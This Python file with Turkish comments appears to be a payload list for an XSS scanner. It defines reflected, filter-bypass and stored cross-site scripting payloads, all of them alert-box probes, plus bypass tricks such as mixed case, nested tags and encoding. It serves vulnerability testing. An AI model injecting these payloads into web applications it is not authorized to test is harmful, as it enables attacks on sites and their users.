# -*- coding: utf-8 -*-
"""XSS (Cross-Site Scripting) Payload Tanımları"""

# Reflected XSS Payload'ları
XSS_PAYLOADS = [
    # Temel XSS payload'ları
    {
        "payload": "<script>alert('XSS')</script>",
        "description": "Basit script tag XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<img src=x onerror=alert('XSS')>",
        "description": "IMG tag onerror XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<svg onload=alert('XSS')>",
        "description": "SVG onload XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "\"><script>alert('XSS')</script>",
        "description": "Attribute breakout XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "'\"><img src=x onerror=alert('XSS')>",
        "description": "Çift tırnak breakout IMG XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<body onload=alert('XSS')>",
        "description": "Body onload XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<iframe src=\"javascript:alert('XSS')\">",
        "description": "Iframe javascript protokolü XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<input onfocus=alert('XSS') autofocus>",
        "description": "Input autofocus XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<marquee onstart=alert('XSS')>",
        "description": "Marquee onstart XSS",
        "category": "Reflected XSS"
    },
    {
        "payload": "<details open ontoggle=alert('XSS')>",
        "description": "Details ontoggle XSS",
        "category": "Reflected XSS"
    },
    # Filtre bypass denemeleri
    {
        "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
        "description": "Karışık büyük/küçük harf bypass",
        "category": "Filter Bypass"
    },
    {
        "payload": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "description": "İç içe script tag bypass",
        "category": "Filter Bypass"
    },
    {
        "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "description": "String.fromCharCode encoding bypass",
        "category": "Filter Bypass"
    },
    {
        "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "description": "URL encoded XSS",
        "category": "Filter Bypass"
    },
    {
        "payload": "<svg/onload=alert('XSS')>",
        "description": "Boşluksuz SVG XSS",
        "category": "Filter Bypass"
    },
]

# Stored XSS Payload'ları
STORED_XSS_PAYLOADS = [
    {
        "name": "TestUser",
        "message": "<script>alert('Stored XSS')</script>",
        "description": "Stored XSS - Yorum alanında script tag"
    },
    {
        "name": "TestUser",
        "message": "<img src=x onerror=alert('StoredXSS')>",
        "description": "Stored XSS - Yorum alanında IMG tag"
    },
    {
        "name": "<script>alert('XSS')</script>",
        "message": "Normal mesaj",
        "description": "Stored XSS - İsim alanında script tag"
    },
]
